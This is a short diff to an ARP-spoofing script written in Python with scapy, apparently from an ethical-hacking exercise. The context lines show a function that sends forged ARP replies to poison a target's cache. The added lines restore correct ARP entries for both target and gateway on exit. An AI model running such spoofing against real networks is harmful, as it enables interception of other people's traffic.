@@ -37,6 +37,12 @@ def spoof(targetIp, spoofIp):
     packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
     scapy.send(packet, verbose=False)
 
+def restore(destIp, srcIp):
+    destMac = getMac(destIp)
+    srcMac = getMac(srcIp)
+    packet = scapy.ARP(op=2, pdst=destIp, hwdst=destMac, psrc=srcIp, hwsrc=srcMac)
+    scapy.send(packet, count=4, verbose=False)
+
 sentPackets = 0
 ips = getArguments()
 try:
@@ -48,4 +54,5 @@ try:
 except KeyboardInterrupt: 
     print('\nFializando ejecución...Limpiando tablas ARP...')
     restore(ips.targetIp, ips.gatewayIp)
+    restore(ips.gatewayIp, ips.targetIp)
     print('Programa finalizado')
